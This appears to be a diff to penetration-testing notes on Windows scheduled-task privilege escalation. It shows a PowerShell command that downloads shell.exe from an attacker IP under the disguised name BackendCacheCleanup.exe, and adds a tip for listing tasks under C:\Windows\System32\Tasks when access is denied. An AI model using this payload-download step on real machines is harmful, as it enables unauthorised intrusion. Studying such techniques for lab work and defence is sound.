@@ -80,3 +80,11 @@ Download the binary onto the target machine.
 ```
 iwr -uri http://192.168.45.193/shell.exe -OutFile BackendCacheCleanup.exe
 ```
+
+#### Access denied
+
+If Access is denied, we can still view tasks in the following path:
+
+```
+C:\Windows\System32\Tasks
+```
